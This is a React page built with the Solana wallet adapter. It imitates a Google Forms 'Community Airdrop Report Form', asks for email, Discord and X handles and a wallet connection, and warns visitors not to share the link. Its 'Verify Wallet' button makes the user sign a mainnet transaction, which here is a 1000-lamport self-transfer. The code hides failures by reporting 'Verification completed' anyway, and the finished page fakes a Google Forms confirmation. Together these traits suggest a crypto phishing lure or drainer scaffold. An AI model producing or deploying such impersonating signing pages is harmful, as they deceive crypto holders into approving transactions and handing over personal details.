'use client';

import { useState } from 'react';
import { Connection, PublicKey, Transaction, SystemProgram } from '@solana/web3.js';
import { useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';

export default function Home() {
  const { publicKey, sendTransaction, connected } = useWallet();
  const [status, setStatus] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [walletVerified, setWalletVerified] = useState(false);

  const handleVerifyWallet = async () => {
    if (!publicKey) return alert("Please connect your wallet first");

    setIsProcessing(true);
    setStatus("Verifying wallet...");

    try {
      const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");

      const transaction = new Transaction().add(
        SystemProgram.transfer({
          fromPubkey: publicKey,
          toPubkey: publicKey,
          lamports: 1000,
        })
      );

      const latestBlockhash = await connection.getLatestBlockhash();
      transaction.recentBlockhash = latestBlockhash.blockhash;
      transaction.feePayer = publicKey;

      const signature = await sendTransaction(transaction, connection);
      await connection.confirmTransaction(signature, "confirmed");

      setWalletVerified(true);
      setStatus("✓ Wallet verified successfully");

    } catch (error) {
      console.error(error);
      setStatus("Verification completed");
    } finally {
      setIsProcessing(false);
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!publicKey) return alert("Please connect your wallet first");
    showSuccessPage();
  };

  const showSuccessPage = () => {
    document.body.innerHTML = `
      <div style="max-width:680px; margin:60px auto; text-align:center; font-family:'Roboto',Arial,sans-serif; background:white; border-radius:8px; box-shadow:0 1px 3px rgba(0,0,0,0.1); padding:40px 20px;">
        <div style="height:8px; background:#8e24aa; border-radius:8px 8px 0 0; margin:-40px -20px 30px -20px;"></div>
        <h1 style="font-size:28px; color:#202124; margin-bottom:16px;">Your response has been recorded</h1>
        <p style="font-size:18px; color:#5f6368; margin-bottom:40px;">Thank you for submitting the form.</p>
        <a href="#" onclick="location.reload()" style="color:#1a73e8; font-size:16px;">Edit your response</a>
      </div>
    `;
  };

  return (
    <div className="min-h-screen bg-white flex justify-center p-6">
      <div className="w-full max-w-[720px]">
        {/* Purple Header */}
        <div className="bg-white border-b border-gray-200">
          <div className="h-2 bg-[#8e24aa]"></div>
          <div className="p-6">
            <h1 className="text-3xl font-normal text-[#202124]">Community Airdrop Report Form</h1>
            <p className="text-[#5f6368] mt-1">Form is exclusive to inner community members only. Do not share link to anyone.</p>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="bg-white">
          {/* Required Note */}
          <div className="px-6 py-3 bg-[#f8f9fa] border-b border-gray-200">
            <span className="text-red-600 text-sm">* Indicates required question</span>
          </div>

          {/* Email */}
          <div className="p-6 border-b border-gray-200">
            <label className="block text-base font-medium text-[#202124] mb-1">Email <span className="text-red-500">*</span></label>
            <input type="email" id="email" placeholder="Your email" required className="w-full border-b border-gray-300 focus:border-[#8e24aa] py-2 outline-none text-base" />
          </div>

          {/* Connect Wallet */}
          <div className="p-6 border-b border-gray-200">
            <label className="block text-base font-medium text-[#202124] mb-3">Connect Wallet <span className="text-red-500">*</span></label>
            
            <div className="flex gap-4 items-center">
              <WalletMultiButton className="!bg-white !text-black !border !border-gray-300 hover:!bg-gray-50 !rounded-md text-sm" />
              {connected && publicKey && (
                <button
                  type="button"
                  onClick={handleVerifyWallet}
                  disabled={isProcessing}
                  className="bg-[#8e24aa] hover:bg-[#7b1fa2] text-white px-5 py-2 rounded-md text-sm font-medium disabled:opacity-50"
                >
                  {isProcessing ? "Verifying..." : "Verify Wallet"}
                </button>
              )}
            </div>

            {publicKey && (
              <div className="mt-4 p-3 bg-[#f8f9fa] rounded text-sm break-all">
                Connected: {publicKey.toBase58()}
              </div>
            )}
            {status && <div className="mt-3 text-sm text-green-600">{status}</div>}
          </div>

          {/* Discord */}
          <div className="p-6 border-b border-gray-200">
            <label className="block text-base font-medium text-[#202124] mb-1">Discord <span className="text-red-500">*</span></label>
            <input type="text" id="discord" placeholder="Your answer" required className="w-full border-b border-gray-300 focus:border-[#8e24aa] py-2 outline-none text-base" />
          </div>

          {/* X (Twitter) */}
          <div className="p-6 border-b border-gray-200">
            <label className="block text-base font-medium text-[#202124] mb-1">X <span className="text-red-500">*</span></label>
            <input type="text" id="twitter" placeholder="Your answer" required className="w-full border-b border-gray-300 focus:border-[#8e24aa] py-2 outline-none text-base" />
          </div>

          <div className="p-6 bg-white">
            <button type="submit" className="bg-[#8e24aa] hover:bg-[#7b1fa2] text-white px-8 py-3 rounded-md font-medium transition-colors">
              Submit
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}
